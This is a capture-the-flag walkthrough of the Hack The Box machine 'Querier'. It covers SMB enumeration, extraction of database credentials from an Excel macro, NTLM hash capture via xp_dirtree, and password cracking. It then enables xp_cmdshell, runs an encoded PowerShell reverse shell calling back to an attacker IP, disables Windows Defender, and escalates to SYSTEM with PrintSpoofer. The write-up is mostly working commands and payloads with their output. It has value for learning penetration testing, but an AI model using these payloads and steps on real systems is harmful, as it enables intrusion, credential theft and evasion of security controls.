
### Initial access
Port scan
```bash
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info: 
|   10.129.41.192:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.41.192:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-09-19T11:22:51
| Not valid after:  2056-09-19T11:22:51
| MD5:     2210 20a6 b226 58c1 587d 49f3 36df f681
| SHA-1:   a9ba 4fed 3f66 7ffb 2106 d328 4bf4 aff1 6008 815d
| SHA-256: 849f 22b6 5217 b6e6 b54b 37b3 3ae7 f0ee 2dd0 2d62 8592 9529 948f 06a1 9c40 5a85
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQVZMILD4KWKhLsjeR5Ap5AjANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjYwOTE5MTEyMjUxWhgPMjA1NjA5MTkxMTIyNTFaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKAcODHd
| xBy/WNW4bJh3t85WUQW7AIKKEdb1h/TE0+JP8SsHEu1il63XcnvjdjGI4qdILLOl
| MK74XMIviCZWvQgBOeCbaEhMurP7GCnWdtDoIg6KCjwhGOToxRNfRmBZkiVNypyw
| S3yFBm7GUZSqx5r/zQNexmtyuDPSGy7KWhuPf/KZbCJmgnFKQXkTyT5yYwpsUUoE
| iq7fU6bzgXume5l7fdJA73LPkOPKpn8UCNyBGc5k7PxSvdSE9aAyfUyrfrrkgp9k
| zy3bO3dKwdEfyj8oENEND0Wamiu07PKPgkKC9t2AOxtrYbKyxfy1k6W20M7P0qlV
| cxcYaFgFNIgFn20CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAesOlXlHvdl92rsVt
| 1rfqXXmRpKAuWW/H2iYyJV1JAb50CeA1jfT7b3P1ml5nD9qDBuq/fTt6yS58KYib
| wE6wsIzhNGx1hxcBKkZD5h/6ZIMBH9zDHaP2s1CgPDWcVCBjJ504nSv5Xvswd4kN
| 7d7IvYRAovIDXUV/uIZvypdj7LgLoKhVVsR6Rh660dZiAPB2H1mS2Se8lx9p9doA
| KUlZ9ziBKDaxhIAkOC1VW4ybZYGCb/0Vq8szostfVLHQDEAbmHkjuAoGcWBZant9
| XjCcFY5ZdFTL0P9oXk0Ob6OMd/UjOymYvHFxHMJWEDKgz5knkWg61No5r0pyT3u0
| aD0jEg==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-09-19T11:27:57+00:00; -1m18s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-19T11:27:52
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 60095/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 46334/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 18935/udp): CLEAN (Timeout)
|   Check 4 (port 40749/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1m18s, deviation: 0s, median: -1m18s

```
SMB recon
```
┌──(kali㉿kali)-[~/HTB/Querier]
└─$ smbclient -L //10.129.41.192 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      

```
Use smb client
```
┌──(kali㉿kali)-[~/HTB/Querier]
└─$ impacket-smbclient :''@10.129.41.192
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use reports
# ls
drw-rw-rw-          0  Mon Jan 28 18:26:31 2019 .
drw-rw-rw-          0  Mon Jan 28 18:26:31 2019 ..
-rw-rw-rw-      12229  Mon Jan 28 18:26:31 2019 Currency Volume Report.xlsm
# 


```

When open it we have marco but in kali we cant execute the macro so i use tool extract marco content
```bash {23}
┌──(kali㉿kali)-[~/HTB/Querier]
└─$ olevba "Currency Volume Report.xlsm"
olevba 0.60.2 on Python 3.14.6 - http://decalage.info/python/oletools
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |

```
We have mssql creds `reporting:PcwTWTHRwryjc$c6`
We have `xp_dirtree` which can send ntmv2 to our responder
```bash
┌──(kali㉿kali)-[~/HTB/Querier]
└─$ impacket-mssqlclient 'reporting':'PcwTWTHRwryjc$c6'@10.129.41.192 -windows-auth
/usr/lib/python3/dist-packages/impacket/mssql/version.py:182: SyntaxWarning: 'return' in a 'finally' block
  return string
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (QUERIER\reporting  reporting@volume)> 
SQL (QUERIER\reporting  reporting@volume)> xp_dirtree //10.10.17.47/shares
subdirectory   depth   file   


```
In responder
```bash
[SMB] NTLMv2-SSP Client   : 10.129.41.192
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:bd41bcb7a94e8049:6E6BB2F6D3C21D0366AB7EC08C691FF0:010100000000000000391D221048DD0187B405E86D54EBF700000000020008004B0038003900380001001E00570049004E002D00480036003900590042005A004300390057004900420004003400570049004E002D00480036003900590042005A00430039005700490042002E004B003800390038002E004C004F00430041004C00030014004B003800390038002E004C004F00430041004C00050014004B003800390038002E004C004F00430041004C000700080000391D221048DD0106000400020000000800300030000000000000000000000000300000DA746E1ECFDD252C308ECDC38074AC351C6427A703EB7558D88C115E8E0EA3290A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E0034003700000000000000000000000000 
```

```bash
┌──(kali㉿kali)-[~/HTB/Querier]
└─$ john --format=NetNTLMv2 --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)     
1g 0:00:00:01 DONE (2026-09-19 08:54) 0.5813g/s 5210Kp/s 5210Kc/s 5210KC/s correforenz..coreyny11
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
                    
```

We have cred `mssql-svc:corporate568`
Accees impacket
```bash
┌──(kali㉿kali)-[~/HTB/Querier]
└─$ impacket-mssqlclient 'mssql-svc:corporate568'@10.129.41.192 -windows-auth 
/usr/lib/python3/dist-packages/impacket/mssql/version.py:182: SyntaxWarning: 'return' in a 'finally' block
  return string
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (QUERIER\mssql-svc  dbo@master)> help
SQL (QUERIER\mssql-svc  dbo@master)> enable_xp_cmdshell
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
                                                    
QL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell dir

```
We have shell execute so let get revshell
```bash
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4ANAA3ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
output                                                                             
--------------------------------------------------------------------------------   
#< CLIXML                                                                          
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+ $client = New-Object System.Net.Sockets.TCPClient("10.10.17.47",4444) ..._x000D__x000A_</S><S S="Error">+ ~~~~~~~   
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">This script contains malicious content and has been blocked by your antivirus software._x000D__x000A_</S><S S="Error">    + CategoryInfo          : ParserError: (   
:) [], ParentContainsErrorRecordException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>   
SQL (QUERIER\mssql-svc  dbo@master)> help

```

And it have firewall so we test to recon
```bash
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "type  C:\Users\mssql-svc\desktop\user.txt"
output                             
--------------------------------   
500990db43a62c9c2fe08e5cebabe23e  
```

### Priv escalation
Check priv
```powershell {40}
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "whoami /all"
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               
USER INFORMATION                                                                   
----------------                                                                   
NULL                                                                               
User Name         SID                                                              
================= ==============================================                   
querier\mssql-svc S-1-5-21-3654930405-3667393904-3517260747-1001                   
NULL                                                                               
NULL                                                                               
GROUP INFORMATION                                                                  
-----------------                                                                  
NULL                                                                               
Group Name                           Type             SID                                                             Attributes                                           
==================================== ================ =============================================================== ==================================================   
Everyone                             Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group   
BUILTIN\Users                        Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group   
BUILTIN\Performance Monitor Users    Alias            S-1-5-32-558                                                    Mandatory group, Enabled by default, Enabled group   
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group   
CONSOLE LOGON                        Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group   
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group   
NT AUTHORITY\This Organization       Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group   
NT AUTHORITY\Local account           Well-known group S-1-5-113                                                       Mandatory group, Enabled by default, Enabled group   
NT SERVICE\MSSQLSERVER               Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner       
LOCAL                                Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group   
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                                     Mandatory group, Enabled by default, Enabled group   
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                                                                         
NULL                                                                               
NULL                                                                               
PRIVILEGES INFORMATION                                                             
----------------------                                                             
NULL                                                                               
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
NULL                                                                               
ERROR: Unable to get user claims information.                                      
NULL 
```
Check spooler
```powershell
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "powershell -Command Get-Service Spooler"
output                                                               
------------------------------------------------------------------   
NULL                                                                 
Status   Name               DisplayName                              
------   ----               -----------                              
Running  Spooler            Print Spooler                            
NULL                                                                 
NULL                                                                 
NULL  
```

Using exploit PrintSpooler64.exe
```powershell
SQL (QUERIER\mssql-svc  dbo@master)> upload /home/kali/oscp/exploit-tool/PrintSpoofer64.exe C:\tmp\PrintSpoofer64.exe
[+] Data length (b64-encoded): 35.34 KB with MD5: 108da75de148145b8f056ec0827f1665
[+] Uploading...
[+] Uploaded
[+] certutil -decode "C:\tmp\PrintSpoofer64.exe.b64" "C:\tmp\PrintSpoofer64.exe"
[+] del "C:\tmp\PrintSpoofer64.exe.b64"
[+] certutil -hashfile "C:\tmp\PrintSpoofer64.exe" MD5
[+] MD5 hashes match
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "dir C:\tmp"
output                                                      
---------------------------------------------------------   
 Volume in drive C has no label.                            
 Volume Serial Number is 35CB-DA81                          
NULL                                                        
 Directory of C:\tmp                                        
NULL                                                        
09/19/2026  02:13 PM    <DIR>          .                    
09/19/2026  02:13 PM    <DIR>          ..                   
09/19/2026  02:13 PM            27,136 PrintSpoofer64.exe   
               1 File(s)         27,136 bytes               
               2 Dir(s)   3,473,240,064 bytes free   
```
Disable av and create revshell

```powershell
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "C:\tmp\PrintSpoofer64.exe -c "powershell -ep bypass -c Set-MpPreference -DisableRealtimeMonitoring $true""
output                                        
-------------------------------------------   
[+] Found privilege: SeImpersonatePrivilege   
[+] Named pipe listening...                   
[+] CreateProcessAsUser() OK                  
NULL                                          
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "C:\tmp\PrintSpoofer64.exe -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4ANAA3ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==""
output                                        
-------------------------------------------   
[+] Found privilege: SeImpersonatePrivilege   
[+] Named pipe listening...                   
[+] CreateProcessAsUser() OK                  
NULL                          ****
```

Revshell session
```bash
┌──(kali㉿kali)-[~/HTB/Querier]
└─$ rlwrap nc -lvnp 4444                                  
listening on [any] 4444 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.41.192] 49682

PS C:\Windows\system32> whoami
nt authority\system

```